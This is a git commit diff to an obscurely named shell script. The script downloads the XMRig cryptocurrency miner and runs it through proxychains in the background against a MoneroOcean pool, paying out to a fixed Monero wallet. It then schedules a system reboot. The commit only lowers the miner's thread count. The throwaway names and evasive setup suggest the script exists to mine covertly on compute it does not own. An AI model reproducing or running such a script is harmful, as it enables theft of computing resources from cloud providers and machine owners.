f3164b3c90c3c5a8c58af4e04df2600be8b200c5
lambangcaptoc <54308112+lambangcaptoc@users.noreply.github.com>
2020-11-16 17:16:27 +0700

    Update dqwehwq21.sh

--- projweqw/dqwehwq21.sh
+++ projweqw/dqwehwq21.sh
@@ -8,7 +8,7 @@ wget https://github.com/MoneroOcean/xmrig/releases/download/v6.5.2-mo1/xmrig-v6.
 tar --extract --file xmrig-v6.5.2-mo1-lin64.tar.gz
 cd xmrig-6.5.2
 export PROXY_DNS_SERVER=1.1.1.1
-proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o  gulf.moneroocean.stream:10128 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL -p 1 x -a cn/r -t 4 -k --tls -B
+proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o  gulf.moneroocean.stream:10128 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL -p 1 x -a cn/r -t 2 -k --tls -B
 sudo shutdown -r +25
 
 
